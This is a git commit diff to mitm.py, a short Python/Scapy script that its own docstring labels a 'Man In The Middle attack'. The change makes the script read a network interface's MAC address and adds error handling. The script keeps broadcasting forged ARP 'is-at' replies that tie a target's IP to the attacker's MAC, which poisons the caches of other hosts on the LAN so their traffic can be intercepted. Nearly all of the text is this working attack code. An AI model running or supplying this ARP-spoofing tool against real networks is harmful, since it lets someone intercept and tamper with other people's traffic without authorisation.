41d30f3b64c07149344ae198aa5eb37bef4d6f91
Paul-Emmanuel Raoul <skyper@skyplabs.net>
2012-07-03 12:26:59 +0200

    use of get_if_hwaddr() method to get NIC's MAC address.

--- mitm.py
+++ mitm.py
@@ -9,24 +9,28 @@ try:
 	print "##           http://blog.skyplabs.net          ##"
 	print "#################################################"
 	
-	MyMAC = sys.argv[1]
+	interface = sys.argv[1]
 	targetIP = sys.argv[2]
 	broadcastIP = sys.argv[3]
 except:
-	print "Usage: " + sys.argv[0] + " <Your MAC> <Target's IP> <Broadcast IP>"
+	print "Usage: " + sys.argv[0] + " <Interface> <Target's IP> <Broadcast IP>"
 	sys.exit(1)
 
-def mitm(MyMAC, targetIP, broadcastIP, interval=15):
+def mitm(interface, targetIP, broadcastIP, interval=15):
 	"""Man In The Middle attack"""
+
 	try:
+		myMAC = get_if_hwaddr(interface)
+		print "[*] Starting attack ..."
 		while 1:
-			sendp(Ether(dst="FF:FF:FF:FF:FF:FF")/ARP(op="is-at", psrc=targetIP, pdst=broadcastIP, hwsrc=MyMAC))
+			sendp(Ether(dst="FF:FF:FF:FF:FF:FF")/ARP(op="is-at", psrc=targetIP, pdst=broadcastIP, hwsrc=myMAC))
 			time.sleep(interval)
+	except IOError:
+		print "[!] Interface doesn't exist"
+		sys.exit(1)
 	except KeyboardInterrupt:
 		pass
 		print ""
 		print "[*] Stopping attack"
 
-
-print "[*] Starting attack ..."
-mitm(MyMAC, targetIP, broadcastIP)
+mitm(interface, targetIP, broadcastIP)
